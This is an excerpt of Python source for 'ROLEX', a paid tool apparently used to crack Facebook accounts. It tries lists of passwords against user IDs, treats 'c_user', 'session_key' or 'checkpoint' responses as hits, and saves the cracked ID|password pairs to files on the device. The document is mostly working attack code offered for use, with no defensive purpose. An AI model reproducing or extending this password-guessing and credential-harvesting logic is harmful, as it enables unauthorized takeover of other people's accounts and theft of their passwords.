...
----------------------------------------------
 Author    : RLX-RIFAT
 Github    : ROLEX-880
 Facebook  : Mohammmed Rifat Sorker
 Tool Name : ROLEX
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 ROLEX Pro version 1.9.8
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ROLEX-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [ROLEX-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ROLEX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ROLEX-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ROLEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ROLEX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ROLEX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ROLEX-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ROLEX-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ROLEX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ROLEX-OK] '+uid+' | '+pas+'\033[1;97m')
